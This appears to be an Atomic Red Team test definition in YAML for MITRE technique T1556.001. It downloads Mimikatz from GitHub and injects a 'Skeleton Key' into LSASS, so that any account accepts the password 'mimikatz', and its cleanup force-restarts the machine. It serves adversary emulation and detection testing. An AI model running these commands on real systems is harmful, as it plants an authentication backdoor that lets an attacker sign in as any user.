attack_technique: T1556.001
display_name: 'Modify Authentication Process'
atomic_tests:

- name: Skeleton Key via Mimikatz
  description: Skeleton Key Attack
  supported_platforms:
    - windows
  input_arguments:
    mimikatz_path:
      type: path
      default: C:\ExternalPayloads\Mimikatz\mimikatz-master\x64\mimikatz.exe
      description: Path to the mimikatz executable
    zipped_path:
      type: path
      default: C:\ExternalPayloads\Mimikatz
      description: Destination path for unzipping mimikatz
    file_path:
      type: path
      default: C:\ExternalPayloads\Mimikatz\mimikatz.zip
      description: File path where the zipped mimikatz file is downloaded to
    mimikatz_url:
      type: url
      default: https://github.com/ParrotSec/mimikatz/archive/refs/heads/master.zip
      description: The URL for mimikatz
    directory_path:
      type: path
      default: C:\ExternalPayloads\Mimikatz
      description: Directory path for mimikatz
  dependency_executor_name: powershell
  dependencies:
    - description: Mimikatz will need to be on the host machine
      prereq_command: |-
        $mimikatz_path = cmd /c echo #{file_path}
        if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
      get_prereq_command: |
        New-Item -Type Directory "#{directory_path}"
        Invoke-WebRequest -Uri "#{mimikatz_url}" -Outfile "#{file_path}"
        Expand-Archive -LiteralPath "#{file_path}" -DestinationPath "#{zipped_path}"
  executor:
    command: |-
      $mimikatz_path = "#{mimikatz_path}"
            Write-Host "Injecting Skeleton Key into LSASS"
            & $mimikatz_path "privilege::debug" "misc::skeleton" "exit"
            Write-Host "Injection complete, you can now authenticate with any user with the password 'mimikatz'"
    cleanup_command: |-
      Remove-Item -Path "#{directory_path}" -Recurse
      Restart-Computer -Force
    name: powershell
    elevation_required: true
